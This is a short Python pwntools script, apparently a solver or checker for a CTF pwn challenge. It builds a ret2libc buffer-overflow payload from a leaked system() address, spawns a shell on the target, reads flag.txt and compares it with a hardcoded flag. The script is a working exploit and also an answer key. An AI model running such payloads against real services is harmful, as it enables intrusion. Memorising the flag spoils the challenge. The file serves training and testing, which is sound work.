from pwn import *
from pprint import pprint
import sys

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def check_challenge(ip,port):
    r = remote(ip, port)
    r.recvuntil("system: ")
    system_addr = int(r.recvline().strip(), 16)
    libc.address = system_addr - libc.symbols["system"]

    ret = 0x40064e
    pop_rdi = 0x400963
    payload = "A"*0x108 + p64(pop_rdi) + p64(next(libc.search("/bin/sh"))) + p64(ret) + p64(system_addr)
    r.sendline(payload)
    r.sendline("cat flag.txt")
    print(r.recvline())
    flag=r.recvline().split("\n")[0]
    pprint(flag)
    if flag == "EFIENS{Amazing_Good_job}":
        return 1   
    return 0
def main():
    argv=sys.argv[1:]
    if len(argv)<2:
        print("Usage: python file IP Port")
        sys.exit("Missing arguments")
    result=check_challenge(argv[0],argv[1])
    if result==1:
        print("Success!")
        return 1
    return 0

if __name__ == "__main__":
    main()


